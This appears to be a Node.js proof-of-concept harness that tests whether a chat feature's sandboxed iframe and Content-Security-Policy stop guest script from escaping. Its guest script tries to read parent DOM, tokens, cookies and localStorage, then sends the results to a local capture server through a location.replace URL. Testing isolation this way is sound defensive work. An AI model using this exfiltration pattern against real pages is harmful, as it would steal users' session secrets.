import http from 'node:http'
import {readFileSync} from 'node:fs'
import {fileURLToPath} from 'node:url'
const shellPath=fileURLToPath(new URL('../../../src/features/chat/visualize/web/document.ts',import.meta.url))
const documentSource=readFileSync(shellPath,'utf8')
const shellSource=documentSource.split('export function buildWebShell(html: string)')[1]
const prelude=documentSource.split('\n').filter(line=>line.startsWith('const STATIC_DOMAINS =')||line.startsWith('const SANDBOX_CSP =')).join('\n')
const buildProductShell=new Function('html',prelude+'\n'+shellSource.slice(shellSource.indexOf('{')+1,shellSource.lastIndexOf('}')))

const hits=[]
http.createServer((req,res)=>{hits.push(req.url);res.end('Captured test state only')}).listen(53194,'127.0.0.1')
const csp="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'"
http.createServer((req,res)=>{
const url=new URL(req.url,'http://localhost:53193')
if(url.pathname==='/results'){res.setHeader('Content-Type','application/json');res.end(JSON.stringify(hits));return}
const mode=url.searchParams.get('mode')||'baseline'
if(mode==='parent-self') res.setHeader('Content-Security-Policy',"frame-src 'self'")
if(mode==='parent-none') res.setHeader('Content-Security-Policy',"frame-src 'none'")
res.setHeader('Content-Type','text/html');res.setHeader('Set-Cookie','host_secret=HOST_ONLY_DUMMY; SameSite=Lax')
let guest=`<html><head><meta http-equiv="Content-Security-Policy" content="${csp}"></head><body>Guest<script>const facts={mode:${JSON.stringify(mode)},ownState:'CURRENT_GUEST_DUMMY'}; for (const [key,read] of [['parentDom',()=>top.document.body.innerHTML],['parentToken',()=>top.secretToken],['cookie',()=>document.cookie],['storage',()=>localStorage.getItem('host_secret')]]) { try { facts[key]=read() } catch(e) { facts[key]='DENIED' } } parent.postMessage({jsonrpc:'2.0',method:'poc/facts',params:{facts}},'*'); setTimeout(()=>location.replace('http://127.0.0.1:53194/capture?data='+encodeURIComponent(JSON.stringify(facts))),100);<\/script></body></html>`
if(mode==='outer-shell') guest=`<html><head><meta http-equiv="Content-Security-Policy" content="${csp}"></head><body><iframe id="inner" sandbox="allow-scripts"></iframe><script>const inner=document.querySelector('#inner');addEventListener('message',event=>{if(event.source===inner.contentWindow)parent.postMessage(event.data,'*')});inner.srcdoc=${JSON.stringify(guest).replaceAll('<','\\u003c')};<\/script></body></html>`

if(mode==='product-shell') guest=buildProductShell(guest)
res.end(`<html><body><pre id="facts">Waiting</pre><iframe id="guest" sandbox="allow-scripts"></iframe><script>window.secretToken='HOST_PAGE_TOKEN_DUMMY'; localStorage.setItem('host_secret','HOST_ONLY_DUMMY'); addEventListener('message',e=>{const payload=e.data.params??e.data;if(payload.facts)document.querySelector('#facts').textContent=JSON.stringify(payload)});document.querySelector('#guest').srcdoc=${JSON.stringify(guest).replaceAll("<", "\\u003c")};</script></body></html>`)
}).listen(53193)
